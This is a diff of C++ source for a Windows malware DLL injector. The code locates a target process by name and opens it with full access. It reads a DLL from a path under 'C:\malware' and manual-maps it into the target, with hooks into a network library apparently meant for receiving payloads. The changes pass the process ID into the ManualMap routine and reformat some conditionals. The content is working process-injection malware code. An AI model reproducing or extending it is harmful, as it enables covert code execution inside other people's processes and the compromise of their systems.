@@ -16,12 +16,14 @@
 typedef int (*SendDataFunc)(const std::string&, const std::string&);
 typedef std::string (*RecvDataFunc)(const std::string&);
 typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
-NTSTATUS ManualMap(HANDLE hproc, std::vector <unsigned char> *downloaded_dll);
+NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloaded_dll);
 
 ///////////////////////////////////////////////////////////////////////////////////////
 SendDataFunc send_data;
 RecvDataFunc receive_data;
 RecvDataRawFunc receive_data_raw;
+
+DWORD PID = 0;
 ///////////////////////////////////////////////////////////////////////////////////////
 
 void* FindExportAddress(HMODULE hModule, const char* funcName)
@@ -80,7 +82,7 @@ void* FindExportAddress(HMODULE hModule, const char* funcName)
 void load_dll()
 {
     HMODULE N_dll = LoadLibraryA("network_lib.dll");
-    if (N_dll == nullptr) std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
+    if(N_dll == nullptr) std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
 
     receive_data_raw = (RecvDataRawFunc)FindExportAddress(N_dll, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
     send_data = (SendDataFunc)FindExportAddress(N_dll, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");    
@@ -100,7 +102,7 @@ HANDLE GetProcessHANDLE(const wchar_t* processName)
         return nullptr;
     }
 
-    DWORD PID = 0;
+    // DWORD PID = 0;
     // BOOL bRet = Process32First(hSnap, &PE32);
     // while(bRet)
     // {
@@ -114,15 +116,15 @@ HANDLE GetProcessHANDLE(const wchar_t* processName)
     // }CloseHandle(hSnap);
 
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot != INVALID_HANDLE_VALUE)
+    if(hSnapshot != INVALID_HANDLE_VALUE)
     {
         PROCESSENTRY32W pe;
         pe.dwSize = sizeof(pe);
-        if (Process32FirstW(hSnapshot, &pe))
+        if(Process32FirstW(hSnapshot, &pe))
         {
             do
             {
-                if (_wcsicmp(pe.szExeFile, processName) == 0)
+                if(_wcsicmp(pe.szExeFile, processName) == 0)
                 {
                     PID = pe.th32ProcessID;
                     break;
@@ -132,7 +134,7 @@ HANDLE GetProcessHANDLE(const wchar_t* processName)
         CloseHandle(hSnapshot);
     }
 
-    if (PID == 0)
+    if(PID == 0)
     {
         fuk("Target process not found");
         return nullptr;
@@ -140,7 +142,7 @@ HANDLE GetProcessHANDLE(const wchar_t* processName)
 
 
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
-    if (!hProc)
+    if(!hProc)
     {
         fuk("[!] Failed to open process: ", GetLastError(), "\n");
         return nullptr;
@@ -161,7 +163,7 @@ int main()
         std::string dll_filename = "C:\\malware\\dll_injection\\basic_dll\\cute_lib.dll"; // Specify the DLL file name
 
         std::ifstream file(dll_filename, std::ios::binary | std::ios::ate);
-        if (!file.is_open())
+        if(!file.is_open())
         {
             fuk("Failed to open " + dll_filename + "\n");
             return 1;
@@ -171,7 +173,7 @@ int main()
         file.seekg(0, std::ios::beg);
 
         downloaded_dll.resize(size);
-        if (!file.read(reinterpret_cast<char*>(downloaded_dll.data()), size))
+        if(!file.read(reinterpret_cast<char*>(downloaded_dll.data()), size))
         {
             fuk("Failed to read " + dll_filename + " into vector\n");
             return 1;
@@ -192,7 +194,7 @@ int main()
 
     #endif
 
-    if(!ManualMap(hProc, &downloaded_dll))
+    if(!ManualMap(hProc, PID, &downloaded_dll))
     {
         CloseHandle(hProc);
         fuk("Failed to inject DLL");
